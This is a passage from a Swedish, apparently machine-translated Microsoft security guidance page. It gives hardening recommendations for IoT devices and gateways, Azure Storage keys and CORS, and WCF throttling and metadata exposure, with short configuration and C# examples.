| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Windows 10 IoT Core implementerar en låg version av enhets kryptering i bit Locker, som har ett starkt beroende på förekomsten av en TPM på plattformen, inklusive det nödvändiga preOS-protokollet i UEFI som utför de nödvändiga måtten. Dessa preOS mätningar säkerställer att operativ systemet senare har en slutgiltig post för hur operativ systemet startades. Kryptera OS-partitioner med hjälp av bit-Locker och eventuella ytterligare partitioner om de lagrar känsliga data. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Se till att endast de lägsta tjänsterna/funktionerna är aktiverade på enheter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL-fas**               | Distribution |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Aktivera eller inaktivera inte några funktioner eller tjänster i operativ systemet som krävs för att lösningen ska fungera. T. ex. om enheten inte kräver att ett användar gränssnitt distribueras installerar du Windows IoT core i konsol löst läge. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Kryptera operativ system och ytterligare partitioner för IoT Field Gateway med bit Locker

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-fält Gateway | 
| **SDL-fas**               | Distribution |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Windows 10 IoT Core implementerar en låg version av enhets kryptering i bit Locker, som har ett starkt beroende på förekomsten av en TPM på plattformen, inklusive det nödvändiga preOS-protokollet i UEFI som utför de nödvändiga måtten. Dessa preOS mätningar säkerställer att operativ systemet senare har en slutgiltig post för hur operativ systemet startades. Kryptera OS-partitioner med hjälp av bit-Locker och eventuella ytterligare partitioner om de lagrar känsliga data. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Kontrol lera att standard inloggnings uppgifterna för fältet Gateway ändras under installationen

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-fält Gateway | 
| **SDL-fas**               | Distribution |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Kontrol lera att standard inloggnings uppgifterna för fältet Gateway ändras under installationen |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Se till att Cloud Gateway implementerar en process för att hålla den inbyggda program varan för anslutna enheter uppdaterad

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT Cloud Gateway | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Gateway-val – Azure-IoT Hub |
| **Referenser**              | [Översikt över IoT Hub enhets hantering](../../iot-hub/iot-hub-device-management-overview.md), [så här uppdaterar du enhetens inbyggda program vara](../../iot-hub/tutorial-firmware-update.md) |
| **Steg** | LWM2M är ett protokoll från Open Mobile Alliance för IoT Device Management. Med Azure IoT Device Management kan du interagera med fysiska enheter med hjälp av enhets jobb. Se till att Cloud Gateway implementerar en process för att rutinmässigt hålla enheten och andra konfigurations data uppdaterade med hjälp av Azure IoT Hub enhets hantering. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Se till att enheterna har slut punkts säkerhets kontroller som kon figurer ATS enligt organisations principer

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Datorns förtroende gränser | 
| **SDL-fas**               | Distribution |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Se till att enheter har säkerhets kontroller av slut punkt, till exempel bit-Locker för kryptering på disk nivå, virus med uppdaterade signaturer, värdbaserade brand väggar, OS-uppgraderingar, grup principer osv. konfigureras enligt organisationens säkerhets principer. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Säkerställ säker hantering av åtkomst nycklar för Azure Storage

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Azure Storage | 
| **SDL-fas**               | Distribution |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Azure Storage säkerhets guide – hantera dina lagrings konto nycklar](../../storage/blobs/security-recommendations.md#identity-and-access-management) |
| **Steg** | <p>Nyckel lagring: Vi rekommenderar att du lagrar Azure Storage åtkomst nycklar i Azure Key Vault som en hemlighet och att programmen hämtar nyckeln från Key Vault. Detta rekommenderas på grund av följande orsaker:</p><ul><li>Programmet kommer aldrig att ha lagrings nyckeln hårdkodad i en konfigurations fil, vilket tar bort minimering från någon som får åtkomst till nycklarna utan specifika behörigheter</li><li>Åtkomst till nycklarna kan kontrol leras med hjälp av Azure Active Directory. Det innebär att en konto ägare kan bevilja åtkomst till fåtal-program som behöver hämta nycklar från Azure Key Vault. Andra program kommer inte att kunna komma åt nycklarna utan att ge dem behörighet särskilt</li><li>Återskapning av nyckel: Vi rekommenderar att du har en process på plats för att återskapa åtkomst nycklar för Azure Storage av säkerhets skäl. Information om varför och hur du planerar för att återskapa nycklar finns dokumenterade i referens artikeln Azure Storage Security guide</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Se till att endast betrodda ursprung är tillåtna om CORS är aktiverat i Azure Storage

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Azure Storage | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [CORS-stöd för Azure Storage-tjänsterna](/rest/api/storageservices/Cross-Origin-Resource-Sharing--CORS--Support-for-the-Azure-Storage-Services) |
| **Steg** | Med Azure Storage kan du aktivera CORS – resurs delning mellan ursprung. För varje lagrings konto kan du ange domäner som har åtkomst till resurserna i det lagrings kontot. Som standard är CORS inaktive rad på alla tjänster. Du kan aktivera CORS genom att använda REST API eller lagrings klient biblioteket för att anropa en av metoderna för att ange tjänst principerna. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Aktivera WCF-funktionen för tjänst begränsning

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | WCF | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | .NET Framework 3 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [FORTIFY kungariket](https://vulncat.fortify.com) |
| **Steg** | <p>Om du inte begränsar användningen av system resurser kan det leda till resurs utbelastning och i sista hand en denial of service.</p><ul><li>**Förklaring:** Windows Communication Foundation (WCF) ger möjlighet att begränsa tjänst begär Anden. Om du tillåter för många klient begär Anden kan det belasta systemet och resurserna. Å andra sidan kan endast ett litet antal begär anden till en tjänst förhindra att legitima användare använder tjänsten. Varje tjänst bör vara individuellt anpassad till och konfigurerad för att tillåta lämplig mängd resurser.</li><li>**Rekommendationer** Aktivera WCF-funktionen för tjänst begränsning och ange lämpliga gränser för ditt program.</li></ul>|

### <a name="example"></a>Exempel
Följande är en exempel konfiguration med begränsning aktiverat:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF-information avslöjas via metadata

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | WCF | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | .NET Framework 3 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [FORTIFY kungariket](https://vulncat.fortify.com) |
| **Steg** | Metadata kan hjälpa angripare att lära sig mer om systemet och planera en form av angrepp. WCF-tjänster kan konfigureras för att exponera metadata. Metadata ger detaljerad information om tjänst beskrivningen och ska inte skickas i produktions miljöer. `HttpGetEnabled`  /  `HttpsGetEnabled` Egenskaperna för ServiceMetaData-klassen definierar om en tjänst ska exponera metadata | 

### <a name="example"></a>Exempel
Koden nedan instruerar WCF att sända en tjänsts metadata
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Sänd inte tjänstens metadata i en produktions miljö. Ange egenskaperna HttpGetEnabled/HttpsGetEnabled för klassen ServiceMetaData som false. 

### <a name="example"></a>Exempel
Koden nedan instruerar WCF att inte sända en tjänsts metadata. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```